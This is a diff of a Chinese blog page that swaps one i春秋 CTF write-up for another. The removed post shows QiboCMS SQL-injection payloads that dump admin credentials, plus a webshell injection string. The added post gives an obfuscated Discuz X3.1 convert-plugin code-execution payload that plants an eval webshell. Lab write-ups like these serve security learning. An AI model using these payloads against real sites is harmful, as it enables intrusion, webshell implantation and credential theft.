@@ -16,7 +16,7 @@
 
 
 
-<title>i春秋刷题——渗透测试笔记 | Blacknight</title>
+<title>i春秋刷题——这不是DZ漏洞？ | Blacknight</title>
 
 
 
@@ -115,7 +115,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">i春秋刷题——渗透测试笔记</h1>
+            <h1 class="post-title">i春秋刷题——这不是DZ漏洞？</h1>
             
                 <div class="post-meta">
                     
@@ -124,7 +124,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">August 15, 2020&nbsp;&nbsp;11:30:00</a>
+                        Date: <a href="#">August 16, 2020&nbsp;&nbsp;11:30:00</a>
                         </span>
                     
                     
@@ -140,47 +140,18 @@
         </header>
 
         <div class="post-content">
-            <p>平台：ichunqiu.com</p>
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815080504.png" alt=""></p>
-<p>目标网站是一个齐博cms，先扫一波目录</p>
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815080743.png" alt=""></p>
-<p>没找到有啥默认用户名和密码，但输入admin提示的是密码错误，但输其他的会显示用户错误，尝试对admin爆破即可。失败</p>
-<p>注册个普通账号，啥都点一下，想起来以前好像做过齐博cms更新资料有个报错注入，百度了一下，可能版本不一样这里没userinfo，pass。</p>
-<p>但还是找到一个整站注入：<a href="https://www.seebug.org/vuldb/ssvid-94157" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-94157</a></p>
-<p>直接爆了管理员账号密码</p>
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815090816.png" alt=""></p>
-<p>但这里密码hash没显示完全，改一下payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?jobs&#x3D;show&amp;label_hf[1&#39; and extractvalue(1,concat(0x5c,(select concat(username,password) from qb_members limit 1)))%23][2]&#x3D;asd</span><br><span class="line">index.php?jobs&#x3D;show&amp;label_hf[1&#39; and extractvalue(1,concat(0x5c,(select substr(password,20,30) from qb_members limit 1)))%23][2]&#x3D;asd</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815093735.png" alt=""></p>
-<p>跟之前的拼接一下得到密码hash：b10a9a82cf828627be682033e6c5878c，解密网站解得：whoami!@#123</p>
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815094014.png" alt=""></p>
-<p>登陆后台</p>
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815094128.png" alt=""></p>
-<p>百度到了一个后台Getshell，<a href="https://xz.aliyun.com/t/2248，试一下" target="_blank" rel="noopener">https://xz.aliyun.com/t/2248，试一下</a></p>
-<p>增加栏目为<code>${assert($_POST[a])}</code>，再菜刀连接/data/guide_fid.php，出错，失败</p>
-<p>再试下这个：<a href="https://www.uedbox.com/post/41188/" target="_blank" rel="noopener">https://www.uedbox.com/post/41188/</a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815101357.png" alt=""></p>
-<p>点击生成静态</p>
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815101506.png" alt=""></p>
-<p>成功getshell</p>
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815101547.png" alt=""></p>
-<p>找到flag文件</p>
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815101736.png" alt=""></p>
-<p>第三题</p>
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815101813.png" alt=""></p>
-<p>打开网站是个discuz论坛</p>
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815103608.png" alt=""></p>
-<p>没看清题目还以为这是两个服务器的站。。。那么直接在刚刚获得的shell里操作</p>
-<p>找下论坛的数据库文件，没找到，瞄一下wp，在dedecms.bak的data文件夹里（问号）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815104142.png" alt=""></p>
-<p>在菜刀的数据库管理填下信息登上去</p>
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815104906.png" alt=""></p>
-<p>然后就是翻salt值，查看所有包含salt字段值的列</p>
-<p><code>select * from information_schema.columns where column_name = &#39;salt&#39;</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815110204.png" alt=""></p>
-<p>到相应位置读取值，这里有两个，看下用户名分别对应哪个即可</p>
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815110253.png" alt=""></p>
+            <p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816083258.png" alt=""></p>
+<p>打开网站是dz论坛，在网站底部看到是dz3.1</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816083412.png" alt=""></p>
+<p>百度下相关漏洞，找到了x3.1的插件/utility/convert/index.php存在代码执行漏洞</p>
+<p>试下，页面没被删除</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816085638.png" alt=""></p>
+<p>payload：<code>a=config&amp;source=d7.2_x2.0&amp;newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(99).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa&amp;submit=yes</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816091511.png" alt=""></p>
+<p>用菜刀连接<code>/utility/convert/data/config.inc.php</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816091538.png" alt=""></p>
+<p>拿到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816091659.png" alt=""></p>
 
         </div>
 
@@ -195,7 +166,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://www.blacknight.top/2020/08/15/ichunqiu_stcebj/">http://www.blacknight.top/2020/08/15/ichunqiu_stcebj/</a></span>
+                        <span><a href="http://www.blacknight.top/2020/08/16/ichunqiu_dz/">http://www.blacknight.top/2020/08/16/ichunqiu_dz/</a></span>
                     </p>
                 
                 
@@ -223,10 +194,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2020/08/16/ichunqiu_dz/">i春秋刷题——这不是DZ漏洞？</a>
+                <a class="prev" rel="prev" href="/2020/08/16/ichunqiu_reinstall/">i春秋刷题——reinstall</a>
             
             
-            <a class="next" rel="next" href="/2020/08/12/ichunqiu_attackpractice/">i春秋刷题——Exploit-Exercises:Nebula</a>
+            <a class="next" rel="next" href="/2020/08/15/ichunqiu_stcebj/">i春秋刷题——渗透测试笔记</a>
             
         </section>
 
